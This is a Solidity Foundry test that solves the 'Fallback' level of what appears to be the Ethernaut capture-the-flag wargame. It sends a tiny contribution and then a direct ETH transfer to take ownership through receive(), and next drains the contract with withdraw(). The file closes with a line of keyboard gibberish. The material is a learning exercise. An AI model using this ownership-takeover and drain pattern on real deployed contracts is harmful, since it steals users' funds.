// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import {Fallback} from "./Fallback.sol";

contract FallbackTest is Test {
    Fallback level;
    address player = makeAddr("player");
    address originalOwner;

    function setUp() public {
        Fallback fallbackContract = new Fallback();
        level = Fallback(payable(address(fallbackContract)));
        originalOwner = level.owner();
        vm.deal(player, 1 ether);
    }

    function test_exploitFallback() public {
        vm.startPrank(player);
        level.contribute{value: 1 wei}();
        assertEq(level.contributions(player), 1 wei, "Contribution not registered");
        (bool sent,) = address(level).call{value: 1 wei}("");
        assertTrue(sent, "Sending ETH failed");
        assertEq(level.owner(), player, "Player did not become owner via receive()");
        level.withdraw();
        uint256 balanceAfter = address(level).balance;
        assertEq(balanceAfter, 0, "Contract still has ETH after withdraw");
        assertEq(level.owner(), player, "Final owner check failed");
        vm.stopPrank();
        console2.log("Exploit successful!");
        console2.log("Player is now owner:", player);
        console2.log("Contract balance after drain:", address(level).balance);
    }
}

///dfsjhgkjzdhsbfgjhzsdbgjkhseklrfhgkjdlfrghkjdsfhg
